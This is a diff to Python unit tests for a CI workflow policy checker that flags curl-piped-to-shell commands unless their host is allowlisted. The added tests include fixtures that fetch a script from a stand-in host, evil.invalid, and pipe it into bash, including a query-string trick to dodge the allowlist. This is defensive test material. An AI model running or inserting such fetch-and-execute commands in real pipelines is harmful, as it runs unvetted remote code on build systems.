@@ -42,12 +42,12 @@ class CheckWorkflowPolicyTest(unittest.TestCase):
 		violations: list[str] = []
 		policy.check_run(".github/workflows/ci.yml", "install", "set -euo pipefail\ncurl https://example.invalid/install | sh\n", violations, {})
 
-		self.assertIn("curl|sh is not allowlisted", violations[0])
+		self.assertIn("curl pipeline to interpreter is not allowlisted", violations[0])
 
 	def test_curl_pipe_passes_with_allowlist_token(self) -> None:
 		violations: list[str] = []
 		run = "set -euo pipefail\ncurl https://example.invalid/install | sh\n"
-		policy.check_run(".github/workflows/ci.yml", "install", run, violations, {".github/workflows/ci.yml": ["example.invalid/install"]})
+		policy.check_run(".github/workflows/ci.yml", "install", run, violations, {".github/workflows/ci.yml": ["example.invalid"]})
 
 		self.assertEqual(violations, [])
 
@@ -56,7 +56,21 @@ class CheckWorkflowPolicyTest(unittest.TestCase):
 		run = "set -euo pipefail\n# example.invalid/install\ncurl https://other.invalid/install | sh\n"
 		policy.check_run(".github/workflows/ci.yml", "install", run, violations, {".github/workflows/ci.yml": ["example.invalid/install"]})
 
-		self.assertIn("curl|sh is not allowlisted", violations[0])
+		self.assertIn("curl pipeline to interpreter is not allowlisted", violations[0])
+
+	def test_curl_multistage_pipe_to_shell_fails(self) -> None:
+		violations: list[str] = []
+		run = "set -euo pipefail\ncurl https://evil.invalid/install | tee /tmp/install.sh | bash\n"
+		policy.check_run(".github/workflows/ci.yml", "install", run, violations, {})
+
+		self.assertIn("curl pipeline to interpreter is not allowlisted", violations[0])
+
+	def test_allowlist_token_collision_does_not_allow_other_host(self) -> None:
+		violations: list[str] = []
+		run = "set -euo pipefail\ncurl 'https://evil.invalid/install?mirror=example.invalid' | bash\n"
+		policy.check_run(".github/workflows/ci.yml", "install", run, violations, {".github/workflows/ci.yml": ["example.invalid"]})
+
+		self.assertIn("curl pipeline to interpreter is not allowlisted", violations[0])
 
 
 if __name__ == "__main__":
